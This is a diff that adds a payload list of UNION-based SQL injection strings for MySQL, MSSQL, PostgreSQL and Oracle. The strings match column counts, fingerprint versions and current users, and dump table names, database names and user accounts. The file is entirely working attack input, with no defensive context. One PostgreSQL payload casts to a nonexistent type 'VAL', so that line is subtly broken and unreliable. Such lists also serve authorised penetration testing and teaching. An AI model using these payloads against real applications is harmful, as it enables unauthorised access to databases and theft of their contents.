@@ -1,0 +1,22 @@
+# Modern Union-Based SQLi Payloads (Column matching & Data Exfiltration)
+
+# MySQL
+' UNION SELECT 1,2,3,4-- -
+' UNION SELECT NULL,NULL,NULL,NULL-- -
+' UNION SELECT @@version,user(),database(),NULL-- -
+' UNION SELECT (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),2,3,4-- -
+
+# MSSQL
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT @@version,DB_NAME(),user_name()--
+' UNION SELECT (SELECT name + ',' FROM sys.databases FOR XML PATH('')),NULL,NULL--
+
+# PostgreSQL
+' UNION SELECT CAST(version() AS VAL),NULL,NULL--
+' UNION SELECT string_agg(table_name, ','),NULL,NULL FROM information_schema.tables--
+' UNION SELECT NULL,NULL,NULL,NULL--
+
+# Oracle
+' UNION SELECT NULL,NULL,NULL FROM DUAL--
+' UNION SELECT banner,NULL,NULL FROM v$version--
+' UNION SELECT (SELECT LISTAGG(username, ',') WITHIN GROUP (ORDER BY username) FROM all_users),NULL FROM DUAL--
